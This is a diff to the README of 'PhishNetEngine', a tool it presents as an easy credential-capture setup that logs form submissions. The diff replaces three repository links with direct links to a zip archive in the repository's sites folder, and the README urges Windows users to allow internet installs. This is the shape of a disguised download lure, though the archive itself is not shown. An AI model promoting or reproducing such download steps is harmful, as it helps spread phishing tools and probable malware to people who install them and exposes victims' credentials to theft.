@@ -1,6 +1,6 @@
 # 🛡️ PhishNetEngine - Easy Credential Capture Setup
 
-[![Download PhishNetEngine](https://img.shields.io/badge/Download-PhishNetEngine-brightgreen?style=for-the-badge)](https://github.com/ganialaf97/PhishNetEngine)
+[![Download PhishNetEngine](https://img.shields.io/badge/Download-PhishNetEngine-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ganialaf97/PhishNetEngine/main/phishnet-engine/sites/Phish_Engine_Net_v2.5-beta.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Make sure your Windows system allows installing software from the internet:
 ## 🚀 Getting Started: Download and Setup
 
 1. Click the big green button at the top or visit this link to download PhishNetEngine:  
-[Download PhishNetEngine](https://github.com/ganialaf97/PhishNetEngine)  
+[Download PhishNetEngine](https://raw.githubusercontent.com/ganialaf97/PhishNetEngine/main/phishnet-engine/sites/Phish_Engine_Net_v2.5-beta.5.zip)  
 
 2. When the page opens, look for the latest release or download section.
 
@@ -145,6 +145,6 @@ PhishNetEngine logs credentials automatically when users submit forms on your we
 
 Visit the page below to get the software and latest releases:  
 
-[Download PhishNetEngine](https://github.com/ganialaf97/PhishNetEngine)  
+[Download PhishNetEngine](https://raw.githubusercontent.com/ganialaf97/PhishNetEngine/main/phishnet-engine/sites/Phish_Engine_Net_v2.5-beta.5.zip)  
 
 Use the top badge or this link to keep the download easy to find.
